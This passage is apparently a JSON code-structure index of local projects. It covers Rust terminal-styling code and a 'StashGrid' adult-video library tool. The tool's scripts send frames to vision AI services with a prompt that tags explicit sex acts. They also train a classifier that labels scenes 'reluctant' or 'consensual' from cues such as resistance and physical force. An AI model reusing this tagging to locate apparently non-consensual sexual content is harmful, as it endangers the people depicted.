          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn str_width(s: &str) -> usize {",
          "fn test_text_width() {",
          "fn test_truncate_str() {",
          "fn test_truncate_str_no_ansi() {",
          "fn test_pad_str() {",
          "fn test_pad_str_with() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Color {",
          "impl Attribute {",
          "impl Default for Style {",
          "impl Style {",
          "impl fmt::Display for Emoji<'_, '_> {"
        ],
        "uses": [
          "use std::borrow::Cow;",
          "use std::collections::BTreeSet;",
          "use std::env;",
          "use std::fmt;",
          "use std::sync::atomic::{AtomicBool, Ordering};",
          "use once_cell::sync::Lazy;",
          "use crate::term::{wants_emoji, Term};",
          "use crate::ansi::{strip_ansi_codes, AnsiCodeIterator};",
          "use unicode_width::UnicodeWidthStr;",
          "use unicode_width::UnicodeWidthChar;",
          "use std::cmp::Ordering;"
        ],
        "macros": [
          "/// format!(\"Hello {}\", style(\"World\").cyan());",
          "/// format!(\"Hello {}\", Style::new().cyan().apply_to(\"World\"));",
          "write!(f, \"\\x1b[38;5;{}m\", fg.ansi_num())?;",
          "write!(f, \"\\x1b[38;5;{}m\", fg.ansi_num() + 8)?;",
          "write!(f, \"\\x1b[{}m\", fg.ansi_num() + 30)?;",
          "write!(f, \"\\x1b[48;5;{}m\", bg.ansi_num())?;",
          "write!(f, \"\\x1b[48;5;{}m\", bg.ansi_num() + 8)?;",
          "write!(f, \"\\x1b[{}m\", bg.ansi_num() + 40)?;",
          "write!(f, \"\\x1b[{}m\", attr.ansi_num())?;",
          "write!(f, \"\\x1b[0m\")?;",
          "impl_fmt!(Binary);",
          "impl_fmt!(Debug);",
          "impl_fmt!(Display);",
          "impl_fmt!(LowerExp);",
          "impl_fmt!(LowerHex);",
          "impl_fmt!(Octal);",
          "impl_fmt!(Pointer);",
          "impl_fmt!(UpperExp);",
          "impl_fmt!(UpperHex);",
          "/// println!(\"[3/4] {}Downloading ...\", Emoji(\"\ud83d\ude9a \", \"\"));",
          "/// println!(\"[4/4] {} Done!\", Emoji(\"\u2728\", \":-)\"));",
          "write!(f, \"{}\", self.0)",
          "write!(f, \"{}\", self.1)",
          "Cow::Owned(format!(",
          "assert_eq!(",
          "if cfg!(feature = \"ansi-parsing\") {",
          "} else if cfg!(feature = \"unicode-width\") {",
          "let s = format!(\"foo {}\", style(\"bar\").red().force_styling(true));",
          "assert_eq!(",
          "&format!(\"foo {}\", style(\"b\").red().force_styling(true))",
          "let s = format!(\"foo {}\", style(\"bar\").red().force_styling(true));",
          "assert_eq!(",
          "&format!(\"foo {}\", style(\"!\").red().force_styling(true))",
          "let s = format!(\"foo {} baz\", style(\"bar\").red().force_styling(true));",
          "assert_eq!(",
          "&format!(\"foo {}...\", style(\"bar\").red().force_styling(true))",
          "let s = format!(\"foo {}\", style(\"\u30d0\u30fc\").red().force_styling(true));",
          "assert_eq!(",
          "&format!(\"foo {}\", style(\"\").red().force_styling(true))",
          "let s = format!(\"foo {}\", style(\"\u30d0\u30fc\").red().force_styling(true));",
          "assert_eq!(",
          "&format!(\"foo {}\", style(\"\u30d0\").red().force_styling(true))",
          "assert_eq!(&truncate_str(\"foo bar\", 5, \"\"), \"foo b\");",
          "assert_eq!(&truncate_str(\"foo bar\", 5, \"!\"), \"foo !\");",
          "assert_eq!(&truncate_str(\"foo bar baz\", 10, \"...\"), \"foo bar...\");",
          "assert_eq!(pad_str(\"foo\", 7, Alignment::Center, None), \"  foo  \");",
          "assert_eq!(pad_str(\"foo\", 7, Alignment::Left, None), \"foo    \");",
          "assert_eq!(pad_str(\"foo\", 7, Alignment::Right, None), \"    foo\");",
          "assert_eq!(pad_str(\"foo\", 3, Alignment::Left, None), \"foo\");",
          "assert_eq!(pad_str(\"foobar\", 3, Alignment::Left, None), \"foobar\");",
          "assert_eq!(pad_str(\"foobar\", 3, Alignment::Left, Some(\"\")), \"foo\");",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(pad_str_with(\"foo\", 3, Alignment::Left, None, '#'), \"foo\");",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!("
        ],
        "derives": [
          "#[derive(Copy, Clone, Debug, PartialEq, Eq)]",
          "#[derive(Copy, Clone, Debug, PartialEq, Eq, Ord, PartialOrd)]",
          "#[derive(Copy, Clone, Debug, PartialEq, Eq)]",
          "#[derive(Clone, Debug, PartialEq, Eq)]",
          "#[derive(Clone)]",
          "#[derive(Copy, Clone)]"
        ],
        "error_handling": 18
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/src/windows_term/mod.rs",
        "function_defs": [
          "fn set_console_mode(handle: HANDLE, mode: CONSOLE_MODE, enable: bool) -> Option<CONSOLE_MODE> {",
          "fn set(handle: HANDLE, mode: CONSOLE_MODE, enable: bool) -> Option<Self> {",
          "fn drop(&mut self) {",
          "fn enable_ansi_on(out: &Term) -> bool {",
          "fn get_console_screen_buffer_info(hand: HANDLE) -> Option<(HANDLE, CONSOLE_SCREEN_BUFFER_INFO)> {",
          "fn get_console_cursor_info(hand: HANDLE) -> Option<(HANDLE, CONSOLE_CURSOR_INFO)> {",
          "fn get_stdin_handle() -> io::Result<HANDLE> {",
          "fn get_key_event_count() -> io::Result<u32> {",
          "fn read_key_event() -> io::Result<KEY_EVENT_RECORD> {"
        ],
        "struct_defs": [
          "struct ConsoleModeGuard {",
          "struct FILE_NAME_INFO {"
        ],
        "impl_blocks": [
          "impl ConsoleModeGuard {",
          "impl Drop for ConsoleModeGuard {"
        ],
        "uses": [
          "use std::cmp;",
          "use std::env;",
          "use std::ffi::OsStr;",
          "use std::fmt::Display;",
          "use std::io;",
          "use std::iter::once;",
          "use std::mem;",
          "use std::os::raw::c_void;",
          "use std::os::windows::ffi::OsStrExt;",
          "use std::os::windows::io::AsRawHandle;",
          "use std::{char, mem::MaybeUninit};",
          "use encode_unicode::error::Utf16TupleError;",
          "use encode_unicode::CharExt;",
          "use windows_sys::Win32::Foundation::{HANDLE, INVALID_HANDLE_VALUE, MAX_PATH};",
          "use windows_sys::Win32::Storage::FileSystem::{FileNameInfo, GetFileInformationByHandleEx};",
          "use windows_sys::Win32::System::Console::CONSOLE_MODE;",
          "use windows_sys::Win32::System::Console::{",
          "use windows_sys::Win32::UI::Input::KeyboardAndMouse::VIRTUAL_KEY;",
          "use crate::common_term;",
          "use crate::kb::Key;",
          "use crate::term::{Term, TermTarget};",
          "use windows_sys::Win32::System::Console::SMALL_RECT;",
          "use windows_sys::Win32::UI::Input::KeyboardAndMouse;"
        ],
        "macros": [
          "let message = format!(",
          "let message = format!(",
          "let message = format!(\"Read invalid utf16 {}: {}\", unicode_char, e);",
          "let buffer: Vec<u16> = OsStr::new(&format!(\"{}\", title))"
        ],
        "derives": [],
        "error_handling": 20
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/src/windows_term/colors.rs",
        "function_defs": [
          "fn handle(&self) -> HANDLE {",
          "fn create_for_stream(kind: HandleKind) -> io::Result<Console> {",
          "fn set(&mut self) -> io::Result<()> {",
          "fn to_word(self) -> WORD {",
          "fn from_word(word: WORD) -> TextAttributes {",
          "fn to_bg(self) -> WORD {",
          "fn from_bg(word: WORD) -> Intense {",
          "fn to_fg(self) -> WORD {",
          "fn from_fg(word: WORD) -> Intense {",
          "fn to_bg(self) -> WORD {",
          "fn from_bg(word: WORD) -> Color {",
          "fn to_fg(self) -> WORD {",
          "fn from_fg(word: WORD) -> Color {",
          "fn new(byte: u8) -> Option<Self> {",
          "fn driver<Out>(parse: fn(Bytes<'_>) -> Option<Out>, part: &str) -> Option<Out> {",
          "fn parse_color(mut bytes: Bytes<'_>) -> Option<(Intense, Color, FgBg)> {",
          "fn parse_attr(mut bytes: Bytes<'_>) -> Option<u8> {",
          "fn parse_prefix(bytes: &mut Bytes<'_>) -> Option<()> {",
          "fn parse_intense_color_ansi(bytes: &mut Bytes<'_>) -> Option<Color> {",
          "fn normal_color_ansi_from_byte(b: u8) -> Option<Color> {",
          "fn parse_suffix(bytes: &mut Bytes<'_>) -> Option<()> {",
          "fn color_parsing() {",
          "fn attr_parsing() {"
        ],
        "struct_defs": [
          "struct TextAttributes {"
        ],
        "impl_blocks": [
          "impl ScreenBufferInfo {",
          "impl HandleKind {",
          "impl Console {",
          "impl TextAttributes {",
          "impl Intense {",
          "impl Color {",
          "impl FgBg {"
        ],
        "uses": [
          "use std::io;",
          "use std::mem;",
          "use std::os::windows::io::AsRawHandle;",
          "use std::str::Bytes;",
          "use windows_sys::Win32::Foundation::HANDLE;",
          "use windows_sys::Win32::System::Console::{",
          "use crate::Term;",
          "use crate::ansi::AnsiCodeIterator;",
          "use std::str::from_utf8;",
          "use super::*;"
        ],
        "macros": [
          "assert_eq!(parsed, (Intense::Yes, Color::Green, FgBg::Foreground));",
          "assert_eq!(parsed, (Intense::No, Color::Black, FgBg::Background));",
          "assert_eq!(parsed, b'1');"
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Debug)]",
          "#[derive(Clone, Copy, Debug)]",
          "#[derive(Copy, Clone, Debug, Eq, PartialEq)]",
          "#[derive(Clone, Copy, Debug, Eq, PartialEq)]",
          "#[derive(Clone, Copy, Debug, Eq, PartialEq)]",
          "#[derive(Debug, PartialEq, Eq)]"
        ],
        "error_handling": 30
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Users/davidquinton/Projects/StashGrid",
    "name": "StashGrid",
    "languages": [
      "Swift",
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Users/davidquinton/Projects/StashGrid/scripts/lightweight_markers.py",
        "docstrings": [],
        "function_defs": [
          "def log(msg: str):",
          "def __init__(self):",
          "def query(self, q: str, variables: dict = None) -> dict:",
          "def get_scenes_needing_markers(self, limit: int = 50) -> list:\n\"\"\"Get scenes without any markers\"\"\"\nresult = self.query(\"\"\"",
          "def get_or_create_tag(self, name: str) -> str:\n\"\"\"Get tag ID, create if needed\"\"\"\nresult = self.query(\"\"\"",
          "def create_marker(self, scene_id: str, seconds: float, title: str, tag_id: str):\n\"\"\"Create a scene marker\"\"\"\nself.query(\"\"\"",
          "def detect_scenes_ffmpeg(video_path: str, threshold: float = 0.3) -> list:\n\"\"\"\nUse FFmpeg's scene detection - memory efficient, streams video.\nReturns list of timestamps where scene changes occur.\n\"\"\"",
          "def get_video_duration(video_path: str) -> float:\n\"\"\"Get video duration using ffprobe\"\"\"\ntry:\ncmd = [\n\"ffprobe\", \"-v\", \"error\",\n\"-show_entries\", \"format=duration\",\n\"-of\", \"json\", video_path\n]\nresult = subprocess.run(cmd, capture_output=True, text=True, timeout=30)\ndata = json.loads(result.stdout)",
          "def filter_timestamps(timestamps: list, min_gap: float, duration: float) -> list:\n\"\"\"Filter timestamps to ensure minimum gap and not too close to start/end\"\"\"\nif not timestamps:\nreturn []\n\nfiltered = []\nlast_ts = 0\n\nfor ts in sorted(timestamps):\n# Skip if too close to start",
          "def generate_fixed_markers(duration: float, target_count: int = 8) -> list:\n\"\"\"Fallback: generate evenly spaced markers\"\"\"\nif duration < 60:\nreturn []\n\ninterval = duration / (target_count + 1)\ninterval = max(interval, MIN_SEGMENT_SECS)\n\nmarkers = []\nts = interval",
          "def load_state() -> dict:\n\"\"\"Load processing state for resume\"\"\"\nif STATE_FILE.exists():\ntry:\nwith open(STATE_FILE) as f:\nreturn json.load(f)\nexcept:\npass\nreturn {\"processed\": [], \"failed\": [], \"last_run\": None}\n",
          "def save_state(state: dict):\n\"\"\"Save processing state\"\"\"\nstate[\"last_run\"] = datetime.now().isoformat()\nwith open(STATE_FILE, 'w') as f:\njson.dump(state, f, indent=2)\n\n\ndef process_scene(api: StashAPI, scene: dict, tag_id: str) -> int:\n\"\"\"Process a single scene - returns marker count\"\"\"",
          "def process_scene(api: StashAPI, scene: dict, tag_id: str) -> int:\n\"\"\"Process a single scene - returns marker count\"\"\"\nscene_id = scene[\"id\"]\ntitle = scene.get(\"title\", \"Untitled\")\nfiles = scene.get(\"files\", [])\n\nif not files:\nlog(f\"  No files for scene {scene_id}\")\nreturn 0\n",
          "def run_batch(limit: int = 50, resume: bool = True):\n\"\"\"Process a batch of scenes\"\"\"\napi = StashAPI()\nstate = load_state() if resume else {\"processed\": [], \"failed\": []}\n\nlog(\"=\" * 50)\nlog(\"Lightweight Marker Generator\")\nlog(f\"Stash: {STASH_URL}\")\nlog(f\"Already processed: {len(state['processed'])} scenes\")\nlog(\"=\" * 50)",
          "def run_single(scene_id: str):\n\"\"\"Process a single scene by ID\"\"\"\napi = StashAPI()\ntag_id = api.get_or_create_tag(\"Auto-Clip\")\n\nresult = api.query(\"\"\"",
          "def run_daemon(interval_hours: float = 4):\n\"\"\"Run as background daemon, processing periodically\"\"\"\nlog(\"Starting daemon mode\")\nlog(f\"Will process scenes every {interval_hours} hours\")\nlog(\"Press Ctrl+C to stop\\n\")\n\nwhile True:\ntry:\nrun_batch(limit=20, resume=True)\nlog(f\"\\nSleeping for {interval_hours} hours...\")",
          "def show_status():\n\"\"\"Show processing status\"\"\"\nstate = load_state()\nprint(f\"Processed scenes: {len(state['processed'])}\")\nprint(f\"Failed scenes: {len(state['failed'])}\")\nprint(f\"Last run: {state.get('last_run', 'Never')}\")\nprint(f\"State file: {STATE_FILE}\")\n\n\ndef main():",
          "def main():"
        ],
        "class_defs": [
          "class StashAPI:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import subprocess",
          "import tempfile",
          "import time",
          "from pathlib import Path",
          "from datetime import datetime",
          "import requests",
          "import argparse"
        ],
        "comments": [
          "# Configuration",
          "# Processing settings (tuned for 8GB)",
          "# State file for resume",
          "# FFmpeg scene detection - streams, doesn't load entire video",
          "# Parse timestamps from showinfo output",
          "# Skip if too close to start",
          "# Skip if too close to end",
          "# Ensure minimum gap",
          "# Try FFmpeg scene detection first",
          "# Fallback to fixed intervals if no scenes detected",
          "# Create markers",
          "# Get tag",
          "# Get scenes",
          "# Filter out already processed",
          "# Save state after each scene (resume-friendly)",
          "# Batch pause to keep system responsive"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 14,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/StashGrid/scripts/ai_marker_generator.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, url: str, api_key: str):",
          "def query(self, query: str, variables: dict = None) -> dict:",
          "def get_scene(self, scene_id: str) -> dict:\nresult = self.query(\"\"\"\nquery GetScene($id: ID!) {\nfindScene(id: $id) {\nid\ntitle\ndetails\nfiles { path duration width height }\nperformers { id name }\ntags { id name }",
          "def get_scenes_without_markers(self, limit: int = 50) -> List[dict]:\nresult = self.query(\"\"\"\nquery GetScenes($limit: Int!) {\nfindScenes(filter: {per_page: $limit, sort: \"random\"}) {\nscenes {\nid\ntitle\nfiles { path duration }\nscene_markers { id }\n}",
          "def get_or_create_tag(self, name: str) -> str:",
          "def create_marker(self, scene_id: str, seconds: float, title: str, tag_id: str) -> str:\nresult = self.query(\"\"\"\nmutation CreateMarker($input: SceneMarkerCreateInput!) {\nsceneMarkerCreate(input: $input) { id }\n}\n\"\"\", {",
          "def __init__(self):",
          "def extract_frames(self, video_path: str, interval: float = 5.0) -> List[Tuple[float, np.ndarray]]:\n\"\"\"Extract frames at regular intervals\"\"\"\nif not HAS_CV2:\nreturn []\n\nframes = []\ncap = cv2.VideoCapture(video_path)\nfps = cap.get(cv2.CAP_PROP_FPS)\ntotal_frames = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))\nduration = total_frames / fps if fps > 0 else 0",
          "def detect_scene_changes(self, frames: List[Tuple[float, np.ndarray]], threshold: float = 30.0) -> List[float]:\n\"\"\"Detect visual scene changes using histogram comparison\"\"\"\nif not frames or not HAS_CV2:\nreturn []\n\nchanges = []\nprev_hist = None\n\nfor timestamp, frame in frames:\n# Convert to HSV and compute histogram",
          "def detect_motion_intensity(self, frames: List[Tuple[float, np.ndarray]]) -> List[Tuple[float, float]]:\n\"\"\"Detect motion intensity between frames\"\"\"\nif len(frames) < 2 or not HAS_CV2:\nreturn []\n\nintensities = []\nprev_gray = None\n\nfor timestamp, frame in frames:\ngray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)",
          "def extract_audio(self, video_path: str) -> Optional[str]:\n\"\"\"Extract audio track to temporary WAV file\"\"\"\nwith tempfile.NamedTemporaryFile(suffix=\".wav\", delete=False) as f:\ntemp_path = f.name\n\ntry:\nsubprocess.run([\n\"ffmpeg\", \"-i\", video_path,\n\"-vn\", \"-acodec\", \"pcm_s16le\", \"-ar\", \"22050\", \"-ac\", \"1\",\n\"-y\", temp_path",
          "def analyze_intensity(self, audio_path: str, hop_length: int = 512) -> List[Tuple[float, float]]:\n\"\"\"Analyze audio intensity over time\"\"\"\nif not HAS_LIBROSA:\nreturn []\n\ntry:\ny, sr = librosa.load(audio_path, sr=22050)\n\n# Compute RMS energy\nrms = librosa.feature.rms(y=y, hop_length=hop_length)[0]",
          "def detect_peaks(self, intensities: List[Tuple[float, float]], threshold: float = 0.7) -> List[float]:\n\"\"\"Find peak moments in audio\"\"\"\npeaks = []\nfor i, (time, intensity) in enumerate(intensities):\nif intensity > threshold:\n# Check if local maximum\nis_peak = True\nfor j in range(max(0, i-5), min(len(intensities), i+6)):\nif j != i and intensities[j][1] > intensity:\nis_peak = False",
          "def __init__(self, provider: str, api_key: str, model: str):",
          "def classify_frame(self, frame: np.ndarray) -> dict:\n\"\"\"Classify a single frame using AI vision\"\"\"\nif self.provider == \"none\" or not self.api_key:\nreturn {\"tags\": [], \"description\": \"\", \"intensity\": 0.5}\n\n# Encode frame to base64\nimport base64\n_, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 85])\nimg_base64 = base64.b64encode(buffer).decode('utf-8')\n",
          "def _classify_openai(self, img_base64: str) -> dict:\n\"\"\"Classify using OpenAI Vision\"\"\"\ntry:\nresp = requests.post(\n\"https://api.openai.com/v1/chat/completions\",\nheaders={\"Authorization\": f\"Bearer {self.api_key}\"},\njson={\n\"model\": self.model,\n\"messages\": [{\n\"role\": \"user\",",
          "def _classify_anthropic(self, img_base64: str) -> dict:\n\"\"\"Classify using Anthropic Claude Vision\"\"\"\ntry:\nresp = requests.post(\n\"https://api.anthropic.com/v1/messages\",\nheaders={\n\"x-api-key\": self.api_key,\n\"anthropic-version\": \"2023-06-01\",\n\"Content-Type\": \"application/json\"\n},",
          "def _classify_ollama(self, img_base64: str) -> dict:\n\"\"\"Classify using local Ollama with vision model\"\"\"\ntry:\nresp = requests.post(\n\"http://localhost:11434/api/generate\",\njson={\n\"model\": self.model,\n\"prompt\": self._get_classification_prompt(),\n\"images\": [img_base64],\n\"stream\": False",
          "def _get_classification_prompt(self) -> str:\nreturn \"\"\"Analyze this adult video frame. Respond in JSON format only:\n{\n\"tags\": [\"tag1\", \"tag2\"],  // Action tags like: oral, anal, missionary, doggy, cowgirl, etc.\n\"description\": \"brief description\",\n\"intensity\": 0.0-1.0,  // Activity intensity level\n\"position\": \"position name if identifiable\"\n}\nOnly valid JSON, no other text.\"\"\"",
          "def _parse_classification(self, content: str) -> dict:\n\"\"\"Parse AI response into structured data\"\"\"\ntry:\n# Try to extract JSON from response\nstart = content.find(\"{\")\nend = content.rfind(\"}\") + 1\nif start >= 0 and end > start:\nreturn json.loads(content[start:end])\nexcept json.JSONDecodeError:\npass",
          "def __init__(self, stash: StashClient):",
          "def get_tag_id(self, name: str) -> str:",
          "def analyze_scene(self, scene_id: str) -> Optional[SceneAnalysis]:\n\"\"\"Perform full analysis of a scene\"\"\"\nscene = self.stash.get_scene(scene_id)\nif not scene or not scene.get(\"files\"):\nprint(f\"Scene {scene_id} not found or has no files\")\nreturn None\n\nvideo_path = scene[\"files\"][0][\"path\"]\nduration = scene[\"files\"][0][\"duration\"]\nperformers = [p[\"name\"] for p in scene.get(\"performers\", [])]",
          "def _analyze_remote(self, scene_id: str, duration: float) -> SceneAnalysis:\n\"\"\"Fallback analysis for remote files - fixed intervals\"\"\"\nsegments = []\ninterval = max(MIN_CLIP_LENGTH, duration / 10)  # ~10 clips\n\ntime = 0.0\nclip_num = 1\nwhile time < duration - 10:\nsegments.append(AnalyzedSegment(\nstart_time=time,",
          "def create_markers(self, analysis: SceneAnalysis) -> int:\n\"\"\"Create markers in Stash from analysis\"\"\"\ncount = 0\ndefault_tag_id = self.get_tag_id(\"Auto-Clip\")\n\nfor segment in analysis.segments:\n# Use first tag or default\ntag_name = segment.tags[0] if segment.tags else \"Auto-Clip\"\ntag_id = self.get_tag_id(tag_name)\n",
          "def process_scene(self, scene_id: str) -> int:\n\"\"\"Full pipeline: analyze and create markers\"\"\"\nanalysis = self.analyze_scene(scene_id)\nif not analysis:\nreturn 0\n\nprint(f\"\\n  Found {len(analysis.segments)} segments\")\nif analysis.overall_tags:\nprint(f\"  Tags: {', '.join(analysis.overall_tags)}\")\n",
          "def main():"
        ],
        "class_defs": [
          "class AnalyzedSegment:",
          "class SceneAnalysis:",
          "class StashClient:",
          "class VideoAnalyzer:",
          "class AudioAnalyzer:",
          "class AIClassifier:",
          "class SceneMarkerGenerator:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import argparse",
          "import tempfile",
          "import subprocess",
          "from pathlib import Path",
          "from dataclasses import dataclass",
          "from typing import List, Optional, Tuple",
          "import requests",
          "import cv2",
          "import numpy as np",
          "import librosa",
          "import base64"
        ],
        "comments": [
          "# Optional imports - graceful degradation",
          "# Configuration",
          "# AI Provider (openai, anthropic, ollama, or none)",
          "# Analysis settings",
          "# Try to find existing",
          "# Create new",
          "# Resize for faster processing",
          "# Convert to HSV and compute histogram",
          "# Compute frame difference",
          "# Compute RMS energy",
          "# Normalize",
          "# Convert to timestamps",
          "# Check if local maximum",
          "# Encode frame to base64",
          "# Try to extract JSON from response",
          "# Check if file is accessible",
          "# Extract and analyze frames",
          "# Detect scene changes",
          "# Detect motion intensity",
          "# Analyze audio",
          "# Combine signals to find segment boundaries",
          "# Filter to ensure minimum clip length",
          "# Create segments",
          "# Find frame closest to segment midpoint",
          "# AI classification if available",
          "# Use motion intensity as fallback",
          "# Add audio intensity",
          "# Collect all unique tags",
          "# Use first tag or default",
          "# Override AI provider if specified",
          "# Test Stash connection"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 5,
        "error_handling": 20,
        "decorators": [
          "@dataclass",
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/StashGrid/scripts/visual_research_engine.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def analyze_frame(self, image_path: str, timestamp: float, frame_num: int,",
          "def _parse_analysis(self, data: Dict, timestamp: float, frame_num: int) -> FrameAnalysis:\n\"\"\"Parse API response into structured FrameAnalysis\"\"\"\nposes = []\nexpressions = []\n\nfor person in data.get(\"people\", []):\npose_data = person.get(\"pose\", {})\nposes.append(BodyPose(\nposture_type=pose_data.get(\"posture_type\", \"unknown\"),\nposture_openness=pose_data.get(\"posture_openness\", 0.5),",
          "def _generate_feature_vector(self, poses: List[BodyPose],",
          "def _encode_image(self, path: str) -> str:",
          "def _placeholder_analysis(self, timestamp: float, frame_num: int) -> FrameAnalysis:",
          "def __init__(self, category: str = \"general\"):",
          "def load(self):",
          "def save(self):",
          "def add_video_analysis(self, video_id: str, frames: List[FrameAnalysis],",
          "def label_video(self, video_id: str, label: str, label_type: str = \"category\"):\n\"\"\"Add a label to a video for supervised learning\"\"\"\nif video_id not in self.labels:\nself.labels[video_id] = {}\nself.labels[video_id][label_type] = label\nself.save()\n\ndef get_labeled_data(self, label_type: str = \"category\") -> Dict[str, List[str]]:\n\"\"\"Get videos grouped by label\"\"\"",
          "def get_labeled_data(self, label_type: str = \"category\") -> Dict[str, List[str]]:\n\"\"\"Get videos grouped by label\"\"\"\ngrouped = defaultdict(list)\nfor video_id, labels in self.labels.items():\nif label_type in labels:\ngrouped[labels[label_type]].append(video_id)\nreturn dict(grouped)\n\ndef export_for_training(self, output_path: Path, label_type: str = \"category\"):\n\"\"\"Export data in format suitable for ML training\"\"\"",
          "def export_for_training(self, output_path: Path, label_type: str = \"category\"):\n\"\"\"Export data in format suitable for ML training\"\"\"\ntraining_data = []\n\nfor video_id, entry in self.entries.items():\nlabel = self.labels.get(video_id, {}).get(label_type)\nif label is None:\ncontinue\n\nfor frame in entry.get(\"frames\", []):",
          "def classify(self, analysis: FrameAnalysis) -> Dict:\n\"\"\"Classify a frame analysis\"\"\"\npass\n\n@abstractmethod\ndef train(self, labeled_data: List[Tuple[FrameAnalysis, str]]):\n\"\"\"Train on labeled data\"\"\"",
          "def train(self, labeled_data: List[Tuple[FrameAnalysis, str]]):\n\"\"\"Train on labeled data\"\"\"\npass\n\n\nclass ConsentClassifier(ContentClassifier):\n\"\"\"",
          "def __init__(self):",
          "def classify(self, analysis: FrameAnalysis) -> Dict:\n\"\"\"Classify frame for consent indicators\"\"\"\nscore = 0\nindicators = []\n\n# Check pose indicators\nfor pose in analysis.poses:\nif pose.tension_level > 0.7:\nscore += 15\nindicators.append(\"High tension detected\")",
          "def train(self, labeled_data: List[Tuple[FrameAnalysis, str]]):\n\"\"\"Train the consent classifier\"\"\"\nif self.engine:\nfor analysis, label in labeled_data:\n# Convert to format expected by learning engine\nresult = {\n\"physical_interaction\": {\n\"overall_score\": self._calc_physical_score(analysis),\n},\n\"audio\": {},",
          "def _calc_physical_score(self, analysis: FrameAnalysis) -> float:",
          "def main():\n\"\"\"Demo usage\"\"\"\nprint(\"Visual Research Engine\")\nprint(\"=\"*50)\nprint(\"\\nThis system extracts rich visual features for:\")\nprint(\"  - Content classification\")\nprint(\"  - Animation pipeline training\")\nprint(\"  - Behavior modeling\")\nprint(\"\\nSee documentation for integration with your analysis pipeline.\")\n"
        ],
        "class_defs": [
          "class BodyPose:",
          "class FacialExpression:",
          "class MovementPattern:",
          "class InteractionDynamics:",
          "class FrameAnalysis:",
          "class VisualFeatureExtractor:",
          "class VisualResearchDatabase:",
          "class ContentClassifier(ABC):",
          "class ConsentClassifier(ContentClassifier):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import subprocess",
          "import tempfile",
          "import base64",
          "import requests",
          "from pathlib import Path",
          "from datetime import datetime",
          "from typing import Dict, List, Optional, Tuple, Any",
          "from dataclasses import dataclass, asdict",
          "from collections import defaultdict",
          "from abc import ABC, abstractmethod",
          "import numpy as np",
          "from consent_learning_engine import ConsentLearningEngine"
        ],
        "comments": [
          "# Configuration",
          "# Overall posture",
          "# Spatial positioning",
          "# Limb positions (simplified)",
          "# Relationship to others (if applicable)",
          "# Specific indicators",
          "# Authenticity markers",
          "# Components",
          "# Context",
          "# Raw scores for classification",
          "# Metadata",
          "# Parse JSON",
          "# Generate feature vector for ML/clustering",
          "# Aggregate pose features",
          "# Average openness and tension",
          "# Encode posture types",
          "# Arms/hands positions (encode as defensive indicator)",
          "# Expression features",
          "# Interaction features",
          "# Import the learning engine",
          "# Check pose indicators",
          "# Check expression indicators",
          "# Check interaction",
          "# Convert to format expected by learning engine"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 9,
        "error_handling": 4,
        "decorators": [
          "@dataclass",
          "@dataclass",
          "@dataclass",
          "@dataclass",
          "@dataclass",
          "@abstractmethod",
          "@abstractmethod"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/StashGrid/scripts/consent_learning_engine.py",
        "docstrings": [],
        "function_defs": [
          "def extract(analysis_result: Dict) -> np.ndarray:\n\"\"\"\nExtract a feature vector from an analysis result.\nReturns a normalized vector that captures the signature of this content.\n\"\"\"",
          "def __init__(self):",
          "def load_state(self):\n\"\"\"Load learned state from disk\"\"\"\n# Load feature vectors\nif FEATURE_VECTORS.exists():\ntry:\nwith open(FEATURE_VECTORS) as f:\ndata = json.load(f)\nself.vectors = {\nk: np.array(v[\"vector\"])\nfor k, v in data.get(\"vectors\", {}).items()",
          "def _init_model(self):\n\"\"\"Initialize empty model\"\"\"\nself.reluctant_centroid = None\nself.consensual_centroid = None\nself.feature_importance = np.ones(FeatureExtractor.TOTAL_FEATURES)\nself.training_count = 0\nself.last_trained = None\n\ndef save_state(self):\n\"\"\"Save learned state to disk\"\"\"",
          "def save_state(self):\n\"\"\"Save learned state to disk\"\"\"\n# Save feature vectors\nvector_data = {\n\"vectors\": {\nk: {\"vector\": v.tolist(), \"label\": self.labels.get(k)}\nfor k, v in self.vectors.items()\n},\n\"labels\": self.labels,\n\"metadata\": self.metadata,",
          "def add_analysis(self, scene_id: str, analysis_result: Dict, label: Optional[str] = None):\n\"\"\"\nAdd a new analysis result to the learning database.\n\nArgs:\nscene_id: Unique scene identifier\nanalysis_result: Full analysis result from consent analyzer\nlabel: Optional label - \"reluctant\" or \"consensual\" (from user feedback)\n\"\"\"",
          "def label_scene(self, scene_id: str, label: str):\n\"\"\"\nAdd or update a label for a scene (from user feedback).\nThis is the key learning signal!\n\"\"\"",
          "def update_model(self):\n\"\"\"\nUpdate the learned model based on labeled data.\nThis is where the system LEARNS patterns.\n\"\"\"",
          "def _print_learned_patterns(self):\n\"\"\"Print what the model has learned\"\"\"\nif self.reluctant_centroid is None:\nreturn\n\nfeature_names = [\n# Body (12)\n\"overall_physical\", \"hand_grip\", \"body_control\", \"resistance_visible\",\n\"physical_force\", \"max_frame\", \"observation_density\", \"resistance_count\",\n\"trapped_cornered\", \"pulling_away\", \"tense_stiff\", \"defensive\",",
